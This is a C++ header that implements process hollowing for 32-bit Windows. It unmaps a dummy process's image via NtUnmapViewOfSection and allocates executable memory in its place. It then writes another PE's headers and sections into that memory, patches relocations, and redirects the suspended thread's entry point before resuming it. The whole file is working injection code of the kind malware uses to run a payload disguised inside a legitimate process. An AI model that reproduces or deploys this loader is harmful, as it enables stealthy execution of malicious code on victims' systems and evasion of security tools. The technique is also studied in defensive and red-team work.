#pragma once

#include "ntapi.h"
#include "mem.h"
#include "PE.h"

// DECLARING FUNCTION (UNDOCUMENTED WINDOWS LIB)
using pNtUnmapViewOfSection = NTSTATUS(WINAPI*)(HANDLE hProcess, PVOID pBaseAddress);
pNtUnmapViewOfSection NtUnmapViewOfSection = nullptr;

/// <summary>
/// 1. UNMAP THE DUMMY PROCESS' MEMORY (NULL ALL BYTES)
/// 2. ALLOCATE MEMORY FOR SOURCE PROCESS WITHIN THE DUMMY PROCESS
/// 3. WRITE PE HEADERS OF SOURCE PROCESS TO DESTINATION PROCESS
/// 4. WRITE ALL SECTIONS OF SOURCE PROCESS TO DESTINATION PROCESS
/// 5. PATCH RAW DATA IN ALL SECTIONS WITH RELOCATIONS
/// </summary>
/// <param name="srcProcessInfo"></param>
/// <param name="strDummyProcessPath"></param>
/// <param name="destImagebase"></param>
/// <returns></returns>
const PROCESS_INFORMATION MapTargetProcess(NewProcessInfo& srcProcessInfo, PROCESS_INFORMATION destProcessInfo, PVOID destImageBase)
{
    SIZE_T ulSrcImageSize = srcProcessInfo.pNtHeaders->OptionalHeader.SizeOfImage;
    DWORD dwSrcHeaderSize = srcProcessInfo.pNtHeaders->OptionalHeader.SizeOfHeaders;
    WORD wSrcNumberOfSections = srcProcessInfo.pNtHeaders->FileHeader.NumberOfSections;

    // GET DELTA BETWEEN STARTING ADDRESS OF DUMMY PROCESS AND STARTING ADDRESS OF SOURCE'S PREFERRED ADDRESS (For part 6)
    DWORD deltaImageBase = (DWORD)destImageBase - srcProcessInfo.pNtHeaders->OptionalHeader.ImageBase;

    NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(
        GetModuleHandle(L"ntdll.dll"), "NtUnmapViewOfSection");
    if (NtUnmapViewOfSection == nullptr)
    {
        fprintf(stderr, "Could not locate NtUnmapViewOfSection.\n");
        exit(-1);
    }


    SIZE_T bytesRead = NULL;

    //1. UNMAP VIEW OF DUMMY PROCESS (BASICALLY NULL ALL THE BYTES BELONGING TO THE PROCESS)
    NTSTATUS ntStatus = NtUnmapViewOfSection(destProcessInfo.hProcess, destImageBase);
    if (!NT_SUCCESS(ntStatus))
    {
        fprintf(stderr, "Could not unmap view of dummy process. Nt Status = %X\n",
            ntStatus);
        exit(-1);
    }

    //2. ALLOCATE MEMORY FOR SOURCE PROCESS WITHIN THE MEMORY SECTION OF THE DUMMY PROCESS
    LPVOID newDestImageBase = VirtualAllocEx(destProcessInfo.hProcess, (LPVOID)destImageBase, ulSrcImageSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (newDestImageBase == NULL)
    {
        fprintf(stderr, "Could not allocate base address of target process into hollow process. ERROR: %d\n",
            GetLastError());
        exit(-1);
    }
    destImageBase = newDestImageBase;

    srcProcessInfo.pNtHeaders->OptionalHeader.ImageBase = (DWORD)destImageBase;
    SIZE_T dwBytesWritten = 0;

    //4. WRITE THE PE HEADERS OF SOURCE PROCESS TO DESTINATION PROCESS' MEMORY LOCATION
    auto result = WriteProcessMemory(destProcessInfo.hProcess, newDestImageBase, srcProcessInfo.pFileData.get(), dwSrcHeaderSize, &dwBytesWritten);
    if (result == NULL)
    {
        printf("Failed to write source's PE header to dummy process");
    }

    //5. WRITE PE SECTIONS OF SOURCE TO DESTINATION

    // ITERATE THROUGH PE SECTIONS OF THE SOURCE PROCESS AND WRITE EACH TO THE DESTINATION PROCESS' MEMORY
    for (auto i = 0; i < wSrcNumberOfSections; ++i)
    {
        // GET OFFSET TO CORRESPONDING SECTION
        int iSectionOffset = srcProcessInfo.pDosHeader->e_lfanew
            + sizeof(IMAGE_NT_HEADERS) + (sizeof(IMAGE_SECTION_HEADER) * i);

        // INTIALIZE SOURCE PROCESS' CURRENT SECTION HEADER
        srcProcessInfo.pSectionHeader = (IMAGE_SECTION_HEADER*)&(srcProcessInfo.pFileData.get()[iSectionOffset]);

        // SET DESTINATION LOCATION (TO WRITE TO)
        LPVOID destSectionLocation = (LPVOID)((DWORD_PTR)destImageBase + srcProcessInfo.pSectionHeader->VirtualAddress);

        // SET SOURCE LOCATION (TO READ FROM)
        PVOID srcSectionLocation = (PVOID) & srcProcessInfo.pFileData.get()[srcProcessInfo.pSectionHeader->PointerToRawData];

        // WRITE CURRENT PE SECTION OF SOURCE TO DESTINATION 
            bool WritePESectionStatus = BOOLIFY(WriteProcessMemory(destProcessInfo.hProcess,
            destSectionLocation,
            srcSectionLocation,
            srcProcessInfo.pSectionHeader->SizeOfRawData, NULL));

        // CHECK IF SECTION WAS SUCCESSFULLY WRITTEN
        if (!WritePESectionStatus)
        {
            fprintf(stderr, "Could not write section to target process. ERROR: %d\n",
                GetLastError());
            exit(-1);
        }
    }

    //6. PATCH WRITTEN BYTES OF SOURCE PROCESS WITH RELOCATIONS

    int iSectionOffset = srcProcessInfo.pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS);
    srcProcessInfo.pSectionHeader = (IMAGE_SECTION_HEADER*)&(srcProcessInfo.pFileData.get()[iSectionOffset]);

    auto srcImageSection = srcProcessInfo.pSectionHeader;

    LPDWORD fileBytesRead = 0;
    for (auto i = 0; i < wSrcNumberOfSections; ++i)
    {
        BYTE* relocSecName = (BYTE*)".reloc";

        // ITERATE THROUGH EACH SECTION OF SOURCE PROCESS UNTIL '.RELOC' SECTION IS FOUND
        if (memcmp(srcImageSection->Name, relocSecName, 5) != 0)
        {
            srcImageSection++;
            continue;
        }

        // GET ADDRESS OF RELOCATION DATA
        DWORD srcRelocationTableRaw = srcImageSection->PointerToRawData;
        DWORD relocationOffset = 0;

        // ITERATE THROUGH EACH SECTION IN THE RELOCATION TABLE
        while (relocationOffset < srcProcessInfo.pRelocationTable->Size)
        {
            // POINTER TO START OF SECTION IN RELOCATION TABLE
            PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK) & (srcProcessInfo.pFileData.get()[srcRelocationTableRaw + relocationOffset]);

            // GET OFFSET TO NEXT SECTION
            relocationOffset += sizeof(BASE_RELOCATION_BLOCK);

            // GET ENTRY COUNT IN CURRENT RELOCATION SECTION
            DWORD relocationEntryCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);

            // GET ARRAY OF RELOCATION ENTRIES
            PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY) & (srcProcessInfo.pFileData.get()[srcRelocationTableRaw + relocationOffset]);

            // POINTER TO START OF RELOCATION ENTRY
            DWORD patchAddress = relocationBlock->PageAddress + relocationEntries[0].Offset;

            // ITERATE THROUGH EACH ENTRY OF THE RELOCATION SECTION
            for (DWORD i = 0; i < relocationEntryCount; i++)
            {
                relocationOffset += sizeof(BASE_RELOCATION_ENTRY);

                if (relocationEntries[i].Type == 0)
                {
                    continue;
                }

                // GET ADDRESS OF THE SECTION THAT REQUIRES PATCHING
                DWORD patchAddress = relocationBlock->PageAddress + relocationEntries[i].Offset;
                DWORD patchedBuffer = 0;

                // READ SECTION DATA TO A BUFFER
                ReadProcessMemory(destProcessInfo.hProcess, (LPCVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), &bytesRead);

                // PATCH SECTION DATA WITH THE DELTA
                patchedBuffer += deltaImageBase;

                // WRITE PATCHED DATA TO THE SECTION 
                WriteProcessMemory(destProcessInfo.hProcess, (PVOID)((DWORD)destImageBase + patchAddress), &patchedBuffer, sizeof(DWORD), fileBytesRead);
            }
        }
    }

    return destProcessInfo;
}

void RunTargetProcess(const NewProcessInfo& srcProcessInfo, const PROCESS_INFORMATION& destProcessInfo, PVOID destImageBase)
{
    CONTEXT ctx = { CONTEXT_FULL };

    // GET TARGET'S THREAD CONTEXT, DUH
    BOOL bRet = BOOLIFY(GetThreadContext(destProcessInfo.hThread, &ctx));
    if (!bRet)
    {
        fprintf(stderr, "Could not get thread context. ERROR: %X\n", GetLastError());
        exit(-1);
    }

    // GET OFFSET TO SOURCE PROCESS' ENTRY POINT
    auto offsetEP = srcProcessInfo.pNtHeaders->OptionalHeader.AddressOfEntryPoint;
    
    // CHANGE CTX EAX TO POINT TO NEW ENTRY POINT
    ctx.Eax = (DWORD)destImageBase + offsetEP;

    // SET TARGET'S THREAD CONTEXT WITH NEW ENTRY POINT (EIP)
    bRet = BOOLIFY(SetThreadContext(destProcessInfo.hThread, &ctx));

    // CHECK IF SUCCESSFULLY SET NEW THREAD CONTEXT
    if (!bRet)
    {
        fprintf(stderr, "Could not set thread context. ERROR: %X\n", GetLastError());
        exit(-1);
    }

    // RESUME THE TARGET PROCESS & VOILA
    auto ThreadResult = ResumeThread(destProcessInfo.hThread);

    // UNLESS IT FAILED THEN BOO :(
    if (ThreadResult == -1)
    {
        fprintf(stderr, "ResumeThread Fail. ERROR: %d\n", GetLastError());
    }

}
